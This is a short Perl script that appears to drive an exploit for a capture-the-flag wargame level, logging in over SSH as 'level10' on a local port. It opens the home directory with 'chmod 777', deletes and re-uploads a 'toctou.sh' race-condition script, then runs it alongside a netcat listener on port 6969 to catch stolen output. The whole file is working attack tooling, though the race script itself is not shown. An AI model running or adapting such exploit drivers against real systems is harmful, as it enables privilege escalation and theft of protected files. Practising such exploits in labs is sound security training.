#!/usr/bin/perl

$port = "22222";
$ip = "localhost";
$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";
$user = "level10";

$chmod = "chmod 777 .";
$ssh = "ssh -qp $port $user\@$ip '$chmod && rm -rf toctou.sh'";
print $red, $chmod, $reset, "\n";
system($ssh);

$scp = "scp -q -P $port ./toctou.sh $user\@$ip:~";
print $green, $scp, $reset, "\n";
system($scp);

$exploit = "./toctou.sh & nc -l 6969";
$ssh2 = "ssh -qp $port $user\@$ip '$exploit'";
print $red, $exploit, $reset, "\n";
system($ssh2);
